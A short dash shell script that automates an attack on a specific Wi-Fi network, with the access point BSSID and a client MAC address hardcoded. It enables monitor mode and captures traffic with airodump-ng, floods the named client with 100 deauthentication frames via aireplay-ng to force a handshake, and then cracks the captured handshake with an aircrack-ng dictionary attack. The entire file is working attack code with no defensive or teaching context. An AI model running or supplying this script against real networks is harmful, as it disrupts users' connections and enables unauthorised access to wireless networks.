#!/bin/dash

. $(dirname $(readlink -f $0))/basic_functions.sh
. $ROOT_DIR/setup_routines.sh

main () 
{
	wlface='wlo1mon'
	apbssid='78:44:fd:f6:86:48'
	climac='3c:71:bf:83:3f:68'

	check_apt aircrack-ng

	airmon-ng start $wlface
	airodump-ng -c 6 --bssid $apbssid -w out $wlface
	aireplay-ng -0 100 -a $apbssid -c $climac $wlface

	read -p 'Enter for stop'

	aircrack-ng -w /path/to/dictionary out.cap
}

maintain()
{
	check_update
	[ "$1" = 'help' ] && show_help_exit $2
}

show_help_exit()
{
	cat << EOL

EOL
	exit 0
}
maintain "$@"; main "$@"; exit $?
